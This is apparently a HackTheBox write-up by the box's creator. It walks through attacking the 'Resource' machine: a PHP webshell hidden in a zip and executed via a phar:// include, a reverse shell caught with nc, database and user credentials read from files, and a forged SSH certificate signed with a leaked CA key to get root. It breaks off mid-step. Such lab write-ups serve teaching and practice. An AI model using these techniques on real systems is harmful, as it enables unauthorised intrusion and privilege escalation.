---
title: HTB: Resource
url: https://0xdf.gitlab.io/2024/11/23/htb-resource.html
date: 2024-11-23T14:45:00+00:00
difficulty: Medium [30]
os: Linux
tags: ctf, hackthebox, htb-resource, nmap, feroxbuster, ssh, ssh-certificate, phar, webshell, har, bash, bash-glob, htb-zipping, htb-codify
---

![Resource](/img/resource-cover.png)

Resource is the 6th box I’ve created to be published on HackTheBox. It’s designed around an IT resource center for a large company who has had their responsibilities for SSH key signing moved up to a different department. I’ll start by creating a ticket with a zip attachment and using a PHAR filter to execute a webshell from that attachment, providing access to the ITRC container. There I’ll get access to the ticket DB and find a .har file with credentials in it. That user has access to the old SSH certificate signing key, which is still valid on this server, and allows for root access. As root, I can find a script that interacts with the IT API for generating SSH certificates, where I can sign an SSH key that gets me onto the main host. There I’ll learn the principal name to pivot to another user and use the API to generate a certificate as that user. That user can run a bash script as root to generate certificates, but there’s a check to make sure the key for this server isn’t used. I’ll abuse a bash glob vulnerability to leak that key, and generate an SSH certificate that gives root access to the IT server.

## Box Info

| Name | [Resource](https://hackthebox.com/machines/resource)  [Resource](https://hackthebox.com/machines/resource) [Play on HackTheBox](https://hackthebox.com/machines/resource) |
| --- | --- |
| Release Date | [03 Aug 2024](https://twitter.com/hackthebox_eu/status/1819047968302899680) |
| Retire Date | 23 Nov 2024 |
| OS | Linux Linux |
| Base Points | ~~Medium [30]~~ Hard [40] |
| Rated Difficulty | Rated difficulty for Resource |
| Radar Graph | Radar chart for Resource |
| First Blood User | 01:51:08[Coontzy1 Coontzy1](https://app.hackthebox.com/users/785708) |
| First Blood Root | 03:25:38[NLTE NLTE](https://app.hackthebox.com/users/260094) |
| Creator | [0xdf 0xdf](https://app.hackthebox.com/users/4935) |

## Recon

### nmap

`nmap` finds three open TCP ports, SSH (22, 2222) and HTTP (80):

```

oxdf@hacky$ nmap -p- --min-rate 10000 10.10.11.27
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-16 16:35 GMT
Nmap scan report for 10.10.11.27
Host is up (0.15s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
2222/tcp open  EtherNetIP-1

Nmap done: 1 IP address (1 host up) scanned in 7.29 seconds
oxdf@hacky$ nmap -p 22,80,2222 -sCV 10.10.11.27
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-16 16:37 GMT
Nmap scan report for 10.10.11.27
Host is up (0.14s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
| ssh-hostkey: 
|   256 78:1e:3b:85:12:64:a1:f6:df:52:41:ad:8f:52:97:c0 (ECDSA)
|_  256 e1:1a:b5:0e:87:a4:a1:81:69:94:9d:d4:d4:a3:8a:f9 (ED25519)
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://itrc.ssg.htb/
2222/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 f2:a6:83:b9:90:6b:6c:54:32:22:ec:af:17:04:bd:16 (ECDSA)
|_  256 0c:c3:9c:10:f5:7f:d3:e4:a8:28:6a:51:ad:1a:e1:bf (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.40 seconds

```

Based on the OpenSSH versions, there seems to be two hosts, one running Debian and one Ubuntu.

The webserver is redirecting to `itrc.ssg.htb`. I’ll add that to my `hosts` file along with the parent domain:

```
10.10.11.27 itrc.ssg.htb ssg.htb

```

### itrc.ssg.htb - TCP 80

#### Site

The page is for an IT resource center:

![image-20241120164648536](/img/image-20241120164648536.png)

I’m able to create an account and log in, and it gives a simple dashboard:

![image-20240216164726013](/img/image-20240216164726013.png)

I can create a ticket:

![image-20240218083846973](/img/image-20240218083846973.png)

It shows up in the dashboard:

![image-20240218083901515](/img/image-20240218083901515.png)

And can be viewed:

![image-20240218083920083](/img/image-20240218083920083.png)

Comments show up as activity:

![image-20240218083942472](/img/image-20240218083942472.png)

#### Tech Stack

All of the pages on the site have URLs like `http://itrc.ssg.htb/?page=dashboard`. This feels like PHP. Visiting `http://itrc.ssg.htb/index.php` returns the dashboard page if logged in, the welcome page if not. So it is a PHP site.

The HTTP response headers set a `PHPSESSID` cookie on first visit:

```

HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Sun, 18 Feb 2024 13:37:19 GMT
Content-Type: text/html; charset=UTF-8
Content-Length: 3120
Connection: close
X-Powered-By: PHP/8.1.27
Set-Cookie: PHPSESSID=3933818570351c6d55aca1650073214f; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Vary: Accept-Encoding

```

The `X-Powered-By` header also shows PHP.

The 404 page is an [Apache 404](/cheatsheets/404#apache--httpd):

![image-20240218084159850](/img/image-20240218084159850.png)

This is interesting because the `Server` header shows nginx. I noted above that there were two SSH ports with different OSes. nginx is likely the front proxy, sending requests to a container that’s running Apache.

#### Directory Brute Force

I’ll run `feroxbuster` against the site, and include `-x php` since I know the site is PHP:

```

oxdf@hacky$ feroxbuster -u http://itrc.ssg.htb -x php

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.9.3
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://itrc.ssg.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.9.3
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 💲  Extensions            │ [php]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        9l       31w      274c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET        9l       28w      277c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET       39l      207w     3120c http://itrc.ssg.htb/
302      GET        0l        0w        0c http://itrc.ssg.htb/logout.php => index.php
200      GET       11l       40w      566c http://itrc.ssg.htb/register.php
200      GET       10l       31w      433c http://itrc.ssg.htb/login.php
301      GET        9l       28w      314c http://itrc.ssg.htb/uploads => http://itrc.ssg.htb/uploads/
301      GET        9l       28w      313c http://itrc.ssg.htb/assets => http://itrc.ssg.htb/assets/
200      GET        3l        5w       46c http://itrc.ssg.htb/admin.php
301      GET        9l       28w      310c http://itrc.ssg.htb/api => http://itrc.ssg.htb/api/
200      GET        5l      110w      844c http://itrc.ssg.htb/home.php
200      GET        0l        0w        0c http://itrc.ssg.htb/db.php
200      GET       39l      207w     3120c http://itrc.ssg.htb/index.php
301      GET        9l       28w      316c http://itrc.ssg.htb/assets/js => http://itrc.ssg.htb/assets/js/
301      GET        9l       28w      317c http://itrc.ssg.htb/assets/css => http://itrc.ssg.htb/assets/css/
301      GET        9l       28w      317c http://itrc.ssg.htb/assets/img => http://itrc.ssg.htb/assets/img/
302      GET        0l        0w        0c http://itrc.ssg.htb/api/login.php => http://itrc.ssg.htb/
302      GET        0l        0w        0c http://itrc.ssg.htb/api/register.php => http://itrc.ssg.htb/
500      GET        0l        0w        0c http://itrc.ssg.htb/api/admin.php
200      GET       13l       25w      367c http://itrc.ssg.htb/assets/js/flash
200      GET       23l       62w     1267c http://itrc.ssg.htb/header.php
200      GET       10l       34w      982c http://itrc.ssg.htb/footer.php
200      GET        3l        5w       46c http://itrc.ssg.htb/dashboard.php
200      GET      155l      300w     2453c http://itrc.ssg.htb/assets/css/main
200      GET       72l      231w     2380c http://itrc.ssg.htb/assets/js/filter
200      GET     4075l    23750w  1953379c http://itrc.ssg.htb/assets/img/helpdesk
200      GET     5106l    29400w  2505094c http://itrc.ssg.htb/assets/img/office
200      GET        3l        5w       46c http://itrc.ssg.htb/ticket.php
200      GET      834l     4513w    74121c http://itrc.ssg.htb/api/phpinfo.php
[####################] - 1m    210000/210000  0s      found:27      errors:0
[####################] - 1m     30000/30000   413/s   http://itrc.ssg.htb/
[####################] - 1m     30000/30000   413/s   http://itrc.ssg.htb/uploads/
[####################] - 1m     30000/30000   414/s   http://itrc.ssg.htb/assets/
[####################] - 1m     30000/30000   413/s   http://itrc.ssg.htb/api/
[####################] - 1m     30000/30000   413/s   http://itrc.ssg.htb/assets/js/
[####################] - 1m     30000/30000   414/s   http://itrc.ssg.htb/assets/css/
[####################] - 1m     30000/30000   413/s   http://itrc.ssg.htb/assets/img/

```

Most of this I can see by browsing the site. There is an `admin.php`.

#### admin.php

Trying to visit `/admin.php` directly just redirects to `/`. But adding it as `/?page=admin` works and loads the admin dash board:

![image-20241121170343055](/img/image-20241121170343055.png)

This was not intended by the author (me), and I’m sad I didn’t catch this.

There’s nothing super useful here, but it does provide some rabbit holes. The “Check Server Up” tool will ping a host. For example, giving it my host:

![image-20241121170528828](/img/image-20241121170528828.png)

And there’s ICMP at my host:

```

oxdf@hacky$ sudo tcpdump -ni tun0 icmp
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
17:02:00.187798 IP 10.10.11.27 > 10.10.14.6: ICMP echo request, id 2, seq 1, length 64
17:02:00.187819 IP 10.10.14.6 > 10.10.11.27: ICMP echo reply, id 2, seq 1, length 64

```

However, this isn’t vulnerable to command injection.

The second button pops up:

![image-20241121170617430](/img/image-20241121170617430.png)

This was meant to show that nothing happened, and maybe a ticket will happen someday. The tools to provision an SSH user are disabled (as the story will show later).

And while I can see all the tickets, clicking on one shows:

![image-20241121170718372](/img/image-20241121170718372.png)

This is just an unintended dead end.

## Shell as www-data in itrc

### Site Behavior

#### Uploads

I’m not able to get a non-zip file to upload to the site. Anything I do to try to get a PHP webshell into the raw file results in:

![image-20240218091845620](/img/image-20240218091845620.png)

If the file name doesn’t end in `.zip`, it fails as well.

When I do upload, the path to the zip is to a file in `/uploads/` where the file looks like a hash with the `.zip` extension.

#### page

My guess at how the site works is that `index.php` is `include`ing another PHP page based on the `page` parameter. If I try `page=index`, it loads a blank page with the header and footer:

![image-20240218091458092](/img/image-20240218091458092.png)

Same with `page=db`. If I try a page that doesn’t exist, it returns the dashboard:

![image-20240218091535233](/img/image-20240218091535233.png)

It seems like it’s checking for the page to exist before including it. That seems to prevent filters as well, such as `page=php://filter/convert.base64-encode/resource=index`.

### Webshell via Phar

#### Upload

My theory is that this site may work very similar to how the site on Zipping worked, and if that’s the case, it may be possible to upload a webshell inside a zip and access it via a Phar filter (just like [the unintended solution there](/2024/01/13/htb-zipping.html#via-phar-filter)).

I’ll create a simple PHP webshell:

```

<?php system($_REQUEST["cmd"]); ?>

```

And add it to a Zip file:

```

oxdf@hacky$ zip shell.zip shell.php 
  adding: shell.php (stored 0%)

```

I’ll upload that in a ticket:

![image-20241120170201822](/img/image-20241120170201822.png)

#### Access

Hovering over the link to the zip shows the full path:

![image-20241120170229846](/img/image-20241120170229846.png)

In this case it’s `uploads/a34387cd3eef30b8d5938ed770909f9a536d8fe0.zip`.

If the site is doing a `file_exists` check, one way to get around that is using the `phar` filter to access the zip. I’ll have it include `phar://uploads//a34387cd3eef30b8d5938ed770909f9a536d8fe0.zip/shell`. It will append the `.php` to get to the webshell. It works!

![image-20241120170444420](/img/image-20241120170444420.png)

The error is that I didn’t provide a `cmd` parameter, but adding `&cmd=id` fixes that:

![image-20240218092731828](/img/image-20240218092731828.png)

#### Shell

I’ll update the command to a [bash reverse shell](https://www.youtube.com/watch?v=OjkVep2EIlw) (encoding the `&` as `%26`):

![image-20241120170635293](/img/image-20241120170635293.png)

At `nc`, I get a shell:

```

oxdf@hacky$ nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.27 59430
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
www-data@itrc:/var/www/itrc$ 

```

I’ll upgrade my shell using the [standard trick](https://www.youtube.com/watch?v=DqE6DxqJg8Q):

```

www-data@itrc:/var/www/itrc$ script /dev/null -c bash
script /dev/null -c bash
Script started, output log file is '/dev/null'.
www-data@itrc:/var/www/itrc$ ^Z
[1]+  Stopped                 nc -lnvp 443
oxdf@hacky$ stty raw -echo ; fg
nc -lnvp 443
            reset
reset: unknown terminal type unknown
Terminal type? screen
www-data@itrc:/var/www/itrc$ 

```

## Shell as msainristil in itrc

### Enumeration

#### Users

There are two users with home directories on this machine:

```

www-data@itrc:/home$ ls
msainristil  zzinter

```

www-data can’t access either. These are the same users with shells set in `/etc/passwd`:

```

www-data@itrc:/home$ cat /etc/passwd | grep "sh$"
root:x:0:0:root:/root:/bin/bash
msainristil:x:1000:1000::/home/msainristil:/bin/bash
zzinter:x:1001:1001::/home/zzinter:/bin/bash

```

#### Web

There are two directories in `/var/www`:

```

www-data@itrc:/var/www$ ls
html  itrc

```

`html` is empty. `itrc` has a bunch of PHP files:

```

www-data@itrc:/var/www/itrc$ ls
admin.php          db.php          index.php     savefile.inc.php
api                filter.inc.php  loggedin.php  ticket.php
assets             footer.inc.php  login.php     ticket_section.inc.php
create_ticket.php  header.inc.php  logout.php    uploads
dashboard.php      home.php        register.php

```

There’s nothing too interesting in the PHP, but `db.php` has the database connection information:

```

<?php

$dsn = "mysql:host=db;dbname=resourcecenter;";
$dbusername = "jj";
$dbpassword = "ugEG5rR5SG8uPd";
$pdo = new PDO($dsn, $dbusername, $dbpassword);

try {
    $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
} catch (PDOException $e) {
    die("Connection failed: " . $e->getMessage());

```

#### Database

I’ll use the database credentials to connect to the database:

```

www-data@itrc:/var/www/itrc$ mysql -h db -u jj -pugEG5rR5SG8uPd 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 33
Server version: 11.2.2-MariaDB-1:11.2.2+maria~ubu2204 mariadb.org binary distribution

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]>

```

The only interesting db is `resourcecenter`:

```

MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| resourcecenter     |
+--------------------+
2 rows in set (0.001 sec)

```

It has three tables:

```

MariaDB [(none)]> use resourcecenter;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [resourcecenter]> show tables;
+--------------------------+
| Tables_in_resourcecenter |
+--------------------------+
| messages                 |
| tickets                  |
| users                    |
+--------------------------+
3 rows in set (0.000 sec)

```

The `users` table has users, but none of the hashes crack with `rockyou.txt`:

```

MariaDB [resourcecenter]> select * from users;
+----+-------------+--------------------------------------------------------------+-------+------------+
| id | user        | password                                                     | role  | department |
+----+-------------+--------------------------------------------------------------+-------+------------+
|  1 | zzinter     | $2y$10$VCpu.vx5K6tK3mZGeir7j.ly..il/YwPQcR2nUs4/jKyUQhGAriL2 | admin | NULL       |
|  2 | msainristil | $2y$10$AT2wCUIXC9jyuO.sNMil2.R950wZlVQ.xayHZiweHcIcs9mcblpb6 | admin | NULL       |
|  3 | mgraham     | $2y$10$4nlQoZW60mVIQ1xauCe5YO0zZ0uaJisHGJMPNdQNjKOhcQ8LsjLZ2 | user  | NULL       |
|  4 | kgrant      | $2y$10$pLPQbIzcehXO5Yxh0bjhlOZtJ18OX4/O4mjYP56U6WnI6FvxvtwIm | user  | NULL       |
|  5 | bmcgregor   | $2y$10$nOBYuDGCgzWXIeF92v5qFOCvlEXdI19JjUZNl/zWHHX.RQGTS03Aq | user  | NULL       |
|  9 | 0xdf        | $2y$10$8toT5vmFASwe.Ui9YnhtZuwff7m9qXtQQzx5Y6UwnWux72AHvNqD6 | user  | NULL       |
+----+-------------+--------------------------------------------------------------+-------+------------+
6 rows in set (0.000 sec)

```

The `messages` and `tickets` tables make up the tickets:

```

MariaDB [resourcecenter]> select * from messages;
+----+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+--------------+---------------------+-----------+---------------------------------------------------------+-----------------+
| id | message                                                                                                                                                                                                                                 | from_user_id | created_at          | ticket_id | attachment                                              | attachment_name |
+----+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+--------------+---------------------+-----------+---------------------------------------------------------+-----------------+
| 18 | I will take care of this.                                                                                                                                                                                                               |            2 | 2024-02-01 12:01:57 |         1 | NULL                                                    | NULL            |
| 19 | Access granted. Signed key will be emailed to you via encrypted email.                                                                                                                                                                  |            2 | 2024-02-03 09:02:33 |         1 | NULL                                                    | NULL            |
| 20 | Thank you. Got it.                                                                                                                                                                                                                      |            3 | 2024-02-03 09:03:12 |         1 | NULL                                                    | NULL            |
| 21 | On it.                                                                                                                                                                                                                                  |            1 | 2024-02-03 14:57:51 |         3 | NULL                                                    | NULL            |
| 22 | I will take care of this.                                                                                                                                                                                                               |            2 | 2024-02-04 13:44:53 |         4 | NULL                                                    | NULL            |
| 23 | We're having some issues with the signing process. I'll get back to you once we have that resolved.                                                                                                                                     |            2 | 2024-02-04 14:25:04 |         4 | NULL                                                    | NULL            |
| 24 | Can you attach a HAR file where the issue happens so the web team can troubleshoot?                                                                                                                                                     |            1 | 2024-02-04 16:12:44 |         5 | NULL                                                    | NULL            |
| 25 | Attached.                                                                                                                                                                                                                               |            2 | 2024-02-04 16:47:23 |         5 | ../uploads/c2f4813259cc57fab36b311c5058cf031cb6eb51.zip | failure.zip     |
| 26 | Any update here? There's a bit of a panic going on in finance.                                                                                                                                                                          |            4 | 2024-02-05 08:01:36 |         3 | NULL                                                    | NULL            |
| 27 | We're going to take four laptops in for reimaging. Will update as that progresses.                                                                                                                                                      |            1 | 2024-02-05 08:12:11 |         3 | NULL                                                    | NULL            |
| 28 | They see the issue. I'm going to have to work with the IT team in corporate to get this resolved. For now, they've given me access to the IT server and a bash script to generate keys. I'll handle all SSH provisioning tickets.       |            1 | 2024-02-05 15:32:54 |         5 | NULL                                                    | NULL            |
| 29 | It's this kind of stuff that makes me say it was a bad idea to move off the old system.                                                                                                                                                 |            2 | 2024-02-05 15:45:11 |         5 | NULL                                                    | NULL            |
| 30 | I've sent you the signed key via secure email                                                                                                                                                                                           |            1 | 2024-02-06 09:12:11 |         4 | NULL                                                    | NULL            |
| 31 | Got it. Thanks.                                                                                                                                                                                                                         |            5 | 2024-02-06 11:25:33 |         4 | NULL                                                    | NULL            |
| 32 | The API from the IT server seems to be working well now. I've got a script that will sign public keys with the appropriate principal to validate it works. I'm still handling these tickets, but hopefully we'll have it resolved soon. |            1 | 2024-02-07 16:21:23 |         5 | NULL                                                    | NULL            |
| 33 | The new system is super flakey. I know it won't work across the rest of the company, but I'm going to at least leave the old certificate in place here until we prove we can work on the new one                                        |            2 | 2024-02-09 16:45:19 |         2 | NULL                                                    | NULL            |
| 34 | Old certificates have been taken out of /etc. I've got the old signing cert secured. This server will trust both the old and the new for some time until we work out any issues with the new system.                                    |            2 | 2024-02-10 09:12:11 |         2 | NULL                                                    | NULL            |
| 35 | Thanks for the update. I'm sure the new system will be fine. Closing this ticket.                                                                                                                                                       |            1 | 2024-02-10 11:27:43 |         2 | NULL                                                    | NULL            |
| 36 | All testing of the updated API seems good. At IT's request I've deleted my SSH keys for their server. I'll still handle tickets using the script until we get a chance to update the ITRC web admin panel to use it.                    |            1 | 2024-02-10 11:53:42 |         5 | NULL                                                    | NULL            |
+----+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+--------------+---------------------+-----------+---------------------------------------------------------+-----------------+
19 rows in set (0.000 sec)

MariaDB [resourcecenter]> select * from tickets;
+----+----------------------------------------------+--------+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+---------------------+--------------+---------------------------------------------------------+--------------------------------+
| id | subject                                      | status | body                                                                                                                                                                                                                                                             | created_at          | submitted_by | attachment                                              | attachment_name                |
+----+----------------------------------------------+--------+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+---------------------+--------------+---------------------------------------------------------+--------------------------------+
|  1 | Need SSH Access to HR Server                 | closed | I need to access the HR server to update the employee handbook.                                                                                                                                                                                                  | 2024-02-01 08:09:21 |            3 | ../uploads/e8c6575573384aeeab4d093cc99c7e5927614185.zip | pubkey-mgraham-please-sign.zip |
|  2 | Decommission ITRC SSH Certificate            | closed | We need to decommission the old ITRC SSH certificate infrastructure in favor of the new organization-wide IT signing certs. I'm handling the transition to the new system from the ITSC-side. Mike - Can you handle removing the old certs from the ITRC server? | 2024-02-02 13:12:11 |            1 | NULL                                                    | NULL                           |
|  3 | Malware in finance dept                      | open   | We have detected malware on the finance department server. We need to take it offline and clean it.                                                                                                                                                              | 2024-02-03 14:12:11 |            4 | NULL                                                    | NULL                           |
|  4 | Please provision access to marketing servers | closed | I'm new to the IT team, need access to the marketing servers in order to apply updates and configure firewall. Public key attached.                                                                                                                              | 2024-02-04 13:27:27 |            5 | ../uploads/eb65074fe37671509f24d1652a44944be61e4360.zip | mcgregor_pub.zip               |
|  5 | SSH Key Signing Broken                       | open   | The admin panel is supposed to allow me to get a signed certificate, but it just isn't working.                                                                                                                                                                   | 2024-02-04 14:19:54 |            2 | NULL                                                    | NULL                           |
|  9 | webshell                                     | open   | this is a webshell                                                                                                                                                                                                                                               | 2024-11-20 22:02:14 |            9 | ../uploads/a34387cd3eef30b8d5938ed770909f9a536d8fe0.zip | shell.zip                      |
+----+----------------------------------------------+--------+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+---------------------+--------------+---------------------------------------------------------+--------------------------------+
6 rows in set (0.001 sec)

```

There’s a story with hints as to where to go next, but it’s easier to see them via the website. I’ll set my user to admin:

```

MariaDB [resourcecenter]> update users set role="admin" where id = 9;
Query OK, 1 row affected (0.003 sec)
Rows matched: 1  Changed: 1  Warnings: 0

```

#### Tickets

On logging back in, there’s an additional button in the menu bar:

![image-20240218141844969](/img/image-20240218141844969.png)

The admin panel gives access to “Admin Tools” as well as “All Tickets”:

![image-20240218141920675](/img/image-20240218141920675.png)

There are a few tickets that give useful information about the path forward.

ID2 talks about zzinter decommissioning the ITRC SSH certificate signing cert, in favor of the new organization-wide IT one. msainristil is says he has the signing certs that are still trusted by this server:

![image-20241120172405239](/img/image-20241120172405239.png)

Ticket ID5 is msainristil complaining that the admin tools for signing certificates isn’t working. zzinter asks for a `.har` file to show it not working. msainristil attaches. zzineter finds the issue, wrks with IT to get a solution. For now, there’s an API on the IT server that handles this, but it isn’t integrated with the admin page yes, and he’ll handle these with a script:

![image-20240218142420811](/img/image-20240218142420811.png)

Both these tickets / messages can be read directly from the database as well.

#### Uploads

I can download the `.har` file from the web, or skip all of that enumeration and go directly to the `uploads` directory when I first get a shell:

```

www-data@itrc:/var/www/itrc/uploads$ ls -l
total 1156
-rw-r--r-- 1 www-data www-data     136 Feb 18 14:20 bc7bf3b3864ecdca3d17e75d37596ea4c2cfa0e7.zip
-rw-rw-r-- 1 www-data www-data 1162513 Feb  6 21:38 c2f4813259cc57fab36b311c5058cf031cb6eb51.zip
-rw-r--r-- 1 www-data www-data     128 Feb 18 14:16 cc589609094dd8d5c1001b3ab2b8d59aacef96ba.zip
-rw-rw-r-- 1 www-data www-data     634 Feb  6 21:46 e8c6575573384aeeab4d093cc99c7e5927614185.zip
-rw-rw-r-- 1 www-data www-data     275 Feb  6 21:42 eb65074fe37671509f24d1652a44944be61e4360.zip
-rw-r--r-- 1 www-data www-data     151 Feb 18 14:22 f02f1654261b61d5efba180f0110f529166c2bef.zip

```

There are several here, but the one that matters is the large one, that has a `.har` file in it:

```

www-data@itrc:/var/www/itrc/uploads$ unzip -l c2f4813259cc57fab36b311c5058cf031cb6eb51.zip
Archive:  c2f4813259cc57fab36b311c5058cf031cb6eb51.zip
  Length      Date    Time    Name
---------  ---------- -----   ----
  1903087  2024-02-06 21:36   itrc.ssg.htb.har
---------                     -------
  1903087                     1 file

```

I’ll download a copy to my host.

### Har File

A Har file is a export of a web session. It has come up in the new in the [October 2023 Okta breach](https://www.reco.ai/blog/securing-your-okta-environment-after-the-har-breach-how-sspm-can-help), where Har files submitted by customers were in the database and allowed attackers to recover session tokens.

[This tweet](https://twitter.com/merill/status/1716259950086001017) summarized the issue well:

> What are HAR files?  
> A HAR file is a recording of your current session & includes all web traffic including secrets & tokens.  
>   
> Admins usually share these files with customer support when troubleshooting issues.  
>   
> Here's a thread on how you can handle .har files safely.  
>   
> 🧵⬇️ [pic.twitter.com/ENJ81BNDiv](https://t.co/ENJ81BNDiv)
>
> — Merill Fernando (@merill) [October 23, 2023](https://twitter.com/merill/status/1716259950086001017?ref_src=twsrc%5Etfw)

In this case, it isn’t the session token that I find, but the user actually logged in while captureing data, leaving their credentials in the clear in the `.har`:

![image-20240218143535577](/img/image-20240218143535577.png)

### su / SSH

This password works to log into the webpage as msainristil, but it also works for `su` or SSH on port 22, which provides a shell in the itrc container:

```

oxdf@hacky$ sshpass -p 82yards2closeit ssh msainristil@itrc.ssg.htb
Linux itrc 5.15.0-94-generic #104-Ubuntu SMP Tue Jan 9 15:25:40 UTC 2024 x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
msainristil@itrc:~$ 

```

The creds do not work on port 2222:

```

oxdf@hacky$ sshpass -p 82yards2closeit ssh -p 2222 msainristil@itrc.ssg.htb
Permission denied, please try again.

```

## Shell as root in itrc

### Enumeration

In msainristil’s home directory, there’s a directory called `decommission_old_ca`:

```

msainristil@itrc:~$ ls -la
total 36
drwxr-xr-x 1 msainristil msainristil 4096 Feb  8 20:00 .
drwxr-xr-x 1 root        root        4096 Feb  8 13:42 ..
-rw-r--r-- 1 msainristil msainristil  220 Apr 23  2023 .bash_logout
-rw-r--r-- 1 msainristil msainristil 3526 Apr 23  2023 .bashrc
-rw-r--r-- 1 msainristil msainristil  807 Apr 23  2023 .profile
drwxr-xr-x 1 msainristil msainristil 4096 Jan 24 22:21 decommission_old_ca

```

It has a certificate authority key pair:

```

msainristil@itrc:~/decommission_old_ca$ ls
ca-itrc  ca-itrc.pub

```

In `/etc/sshd_config.d` there’s an `sshcerts.conf` file:

```

msainristil@itrc:/etc/ssh$ cat sshd_config.d/sshcerts.conf 
HostKey /etc/ssh/ssh_host_rsa_key
HostKey /etc/ssh/ssh_host_ecdsa_key
HostKey /etc/ssh/ssh_host_ed25519_key
HostCertificate /etc/ssh/ssh_host_rsa_key-cert.pub
HostCertificate /etc/ssh/ssh_host_ecdsa_key-cert.pub
HostCertificate /etc/ssh/ssh_host_ed25519_key-cert.pub
TrustedUserCAKeys /etc/ssh/ca_users_keys.pub

```

The `ca_user_keys.pub` file has two public keys:

```

msainristil@itrc:/etc/ssh$ cat ca_users_keys.pub 
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDoBD1UoFfL41g/FVX373rdm5WPz+SZ0bWt5PYP+dhok4vb3UpJPIGOeAsXmAkzEVYBHIiE+aGbrcXvDaSbZc6cI2aZfFraEPt080KVKHALAPgaOn/zFdld8P9yaENKBKltWLZ9I6rwg98IGEToB7JNZF9hzasjjD0IDKv8JQ3NwimDcZTc6Le0hJw52ANcLszteliFSyoTty9N/oUgTUjkFsgsroEh+Onz4buVD2bxoZ+9mODcdYTQ4ChwanfzFSnTrTtAQrJtyH/bDRTa2BpmdmYdQu+4HcbDl5NbiEwu1FNskz/YNDPkq3bEYEOvgMiu/0ZMy0wercx6Tn0G2cppS70/rG5GMcJi0WTcUic3k+XJ191WEG1EtXJNbZdtJc7Ky0EKhat0dgck8zpq62kejtkBQd86p6FvR8+xH3/JMxHvMNVYVODJt/MIik99sWb5Q7NCVcIXQ0ejVTzTI9QT27km/FUgl3cs5CZ4GIN7polPenQXEmdmbBOWD2hrlLs= ITRC Certificate CA
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIHg8Cudy1ShyYfqzC3ANlgAcW7Q4MoZuezAE8mNFSmx Global SSG SSH Certificate from IT

```

There’s an RSA key from ITRC, and a ED25519 key from IT. This matches what was discussed in the tickets previously. If I have a key pair that’s signed by either of these two CA’s, it’ll be accepted by the server. I’ll exfil these files.

### SSH

#### Sign Key

I’ll sign my public key with `ssh-keygen`:

```

oxdf@hacky$ ssh-keygen -s ca_itrc -z 223 -I '0xdf' -V -5m:forever -n root ~/keys/ed25519_gen.pub
Signed user key /home/oxdf/keys/ed25519_gen-cert.pub: id "0xdf" serial 223 for root valid after 2024-11-16T17:36:12

```

The `-s` specifies the CA certificate, `-z` is a serial id which doesn’t really matter. `-I` is the certificate identity. `-V` is the valid time. and `-n` is the principle that I am signing the key to represent.

That creates a `ed33519_gen-cert.pub` file in the same directory:

```

oxdf@hacky$ cat ~/keys/ed25519_gen-cert.pub
